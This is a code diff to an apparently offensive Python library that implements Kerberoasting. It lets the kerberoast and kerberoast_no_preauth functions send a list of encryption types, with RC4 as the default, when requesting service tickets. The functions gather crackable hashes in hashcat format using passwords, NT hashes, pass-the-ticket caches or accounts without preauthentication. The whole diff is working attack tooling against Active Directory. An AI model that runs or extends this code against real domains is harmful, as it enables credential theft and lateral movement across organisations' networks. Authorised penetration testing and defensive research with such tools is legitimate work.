@@ -39,7 +39,7 @@ def kerberoast(
     *,
     dc_ip: str,
     domain: str = "",
-    etype: EncryptionType = EncryptionType.RC4_HMAC,
+    etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
     target_spns: list[str] | None = None,
     hash_format: HashFormat = HashFormat.HASHCAT,
     transport: TransportProtocol = TransportProtocol.TCP,
@@ -54,11 +54,14 @@ def kerberoast(
     - **Password/hash**: provide *cred* with username + password/nthash.
     - **CCache (pass-the-ticket)**: provide *tgt*, *tgt_session_key*, *tgt_cipher_cls*.
 
-    Targets may be SPNs, sAMAccountNames, or UPNs.
+    Targets may be SPNs, sAMAccountNames, or UPNs.  The *etypes* tuple
+    is sent in the TGS-REQ in order, letting the KDC pick the first one
+    the service account supports.
     """
     if not target_spns:
         return []
 
+    etype_ints = tuple(int(e) for e in etypes)
     realm = domain or (cred.domain if cred else "")
 
     # Get TGT: either pre-loaded from ccache or fresh from KDC.
@@ -67,8 +70,8 @@ def kerberoast(
     elif cred is not None:
         # Authenticate with RC4 for the TGT (always supported).
         # The target etype is used for the TGS request, not the TGT.
-        tgt_etype = EncryptionType.RC4_HMAC
-        raw_tgt, _client_key, session_key = request_tgt(cred, dc_ip=dc_ip, etype=tgt_etype, transport=transport, timeout=timeout)
+        tgt_etypes = (EncryptionType.RC4_HMAC,)
+        raw_tgt, _client_key, session_key = request_tgt(cred, dc_ip=dc_ip, etypes=tgt_etypes, transport=transport, timeout=timeout)
         cipher_cls = ENCTYPE_TABLE[session_key.enctype]
     else:
         msg = "Either credentials or a TGT (from ccache) must be provided."
@@ -85,7 +88,7 @@ def kerberoast(
                 service=target,
                 domain=realm,
                 dc_ip=dc_ip,
-                etypes=(int(etype),),
+                etypes=etype_ints,
                 transport=transport,
                 timeout=timeout,
             )
@@ -126,7 +129,7 @@ def kerberoast_no_preauth(
     *,
     domain: str,
     dc_ip: str,
-    etype: EncryptionType = EncryptionType.RC4_HMAC,
+    etypes: tuple[EncryptionType, ...] = (EncryptionType.RC4_HMAC,),
     target_users: list[str] | None = None,
     hash_format: HashFormat = HashFormat.HASHCAT,
     transport: TransportProtocol = TransportProtocol.TCP,
@@ -140,6 +143,8 @@ def kerberoast_no_preauth(
     if not target_users:
         return []
 
+    etype_ints = tuple(int(e) for e in etypes)
+
     results: list[RoastResult] = []
     for i, target in enumerate(target_users, 1):
         _log.info("[%d/%d] %s (via %s)", i, len(target_users), target, no_preauth_user)
@@ -148,7 +153,7 @@ def kerberoast_no_preauth(
                 no_preauth_user,
                 domain,
                 dc_ip=dc_ip,
-                etypes=(int(etype),),
+                etypes=etype_ints,
                 server=target,
                 transport=transport,
                 timeout=timeout,
